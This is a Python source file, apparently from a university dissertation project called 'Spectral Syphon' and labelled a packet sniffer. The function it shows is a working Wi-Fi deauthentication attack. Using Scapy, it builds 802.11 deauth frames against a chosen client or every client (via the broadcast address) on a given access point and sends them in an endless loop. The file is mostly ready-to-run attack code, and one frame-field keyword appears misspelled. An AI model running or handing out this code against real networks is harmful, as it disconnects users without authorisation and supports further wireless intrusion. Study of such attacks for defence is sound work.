###########################################################################
###########################################################################
###########################################################################
###########                                                     ###########
###########                  SPECTRAL SYPHON                    ###########
###########                   Packet sniffer                    ###########
###########                    Version 1.0                      ###########
###########                                                     ###########
###########               PROIECT DE DISERTATIE                 ###########
###########         Author: Ion-Margarit Adrian-Florin          ###########
###########       Facultatea de Matematica si Informatica       ###########
###########             Universitatea din Bucuresti             ###########
###########                                                     ###########
###########################################################################
###########################################################################
###########################################################################


from scapy.all import *
import sys
import os
from colorama import Fore, Back, Style


def deauthentication(target_mac, gateway_mac, iface, default_iface=''):
    count = 0
    inter = 0.01

    # If the user isn't root or sudo, access is denied
    if not 'SUDO_UID' in os.environ.keys():
        print(
            f'{Fore.RED}[!!!] Access denied. Please run the program as root or sudo.{Style.RESET_ALL}')
        sys.exit()

    try:
        if count == 0:
            # If the count is 0, the program will result in an infinite loop
            loop = 1
            count = None
        else:
            loop = 0

        if target_mac.lower() == 'a':
            target_mac = 'ff:ff:ff:ff:ff:ff'

        dot11 = Dot11(type=8, sybtype=12, addr1=target_mac,
                      addr2=gateway_mac, addr3=gateway_mac)

        if default_iface != '':
            iface = default_iface

        choice = input(f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Target MAC: {target_mac}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.RED} Interface: {iface}{Style.RESET_ALL}\n{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Keep going? (y/n){Style.RESET_ALL}')

        if choice.lower() == 'y':
            if count:
                print(
                    f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Sending {count} deauthentication packets every {inter}s...{Style.RESET_ALL}')
            else:
                print(
                    f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Sending infinite deauthentication packets every {inter}s until keyboard interrupt...{Style.RESET_ALL}')

            # Stacking up the layers
            packet = RadioTap()/dot11/Dot11Deauth()

            while True:
                try:
                    # Sending the packet
                    sendp(packet, iface=iface, inter=inter,
                          count=count, loop=loop, verbose=1)

                except Exception as e:
                    print(
                        f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED} Error: {e}{Style.RESET_ALL}')

                except KeyboardInterrupt:
                    print(
                        f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Keyboard interrupt. Exiting...{Style.RESET_ALL}')
                    sys.exit()
                    break
        else:
            print('Process aborted. Exiting...')
            sys.exit()

    except Exception as e:
        print(
            f'{Fore.GREEN}[---]{Style.RESET_ALL}{Fore.RED} Error: {e}{Style.RESET_ALL}')

    except KeyboardInterrupt:
        print(
            f'{Fore.GREEN}[+++]{Style.RESET_ALL}{Fore.YELLOW} Keyboard interrupt. Exiting...{Style.RESET_ALL}')
        sys.exit()
